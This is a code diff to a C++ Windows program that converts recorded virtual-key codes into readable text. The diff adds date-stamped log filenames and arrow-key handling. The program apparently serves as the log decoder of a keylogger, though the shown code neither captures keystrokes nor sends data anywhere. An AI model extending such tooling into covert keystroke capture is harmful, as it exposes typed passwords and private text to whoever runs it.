@@ -6,10 +6,11 @@
 #include <windows.h>
 #include <ctype.h>
 #include <map>
+#include <time.h>
 
 using namespace std;
 
-void createMap(map<unsigned short, pair<unsigned short, unsigned short>> &shift) {
+void createMap(map<unsigned short, pair<unsigned short, unsigned short>>& shift) {
   ifstream in("shift_keys.txt");
 
   unsigned short val;
@@ -20,12 +21,25 @@ void createMap(map<unsigned short, pair<unsigned short, unsigned short>> &shift)
   in.close();
 }
 
+string getDate() {
+  char s[20];
+  time_t t;
+
+  tm *ptr;
+
+  t = time(NULL);
+  ptr = localtime(&t);
+
+  strftime(s, 20, "%d.%m.%Y_%Hh", ptr);
+  return string(s);
+}
+
 int main() {
   map<unsigned short, pair <unsigned short, unsigned short>> shift;
   createMap(shift);
 
   ifstream in("ascii");
-  ofstream out("text");
+  ofstream out(getDate() + ".log");
 
   unsigned short ch;
   bool shiftState, capsState = false;
@@ -57,6 +71,12 @@ int main() {
       break;
     case VK_DOWN:
       out << "\nDOWN ARROW KEY\n";
+      break;
+    case VK_LEFT:
+      out << "\nLEFT ARROW KEY\n";
+      break;
+    case VK_RIGHT:
+      out << "\nRIGHT ARROW KEY\n";
       break;
     case VK_BACK:
       int pos;
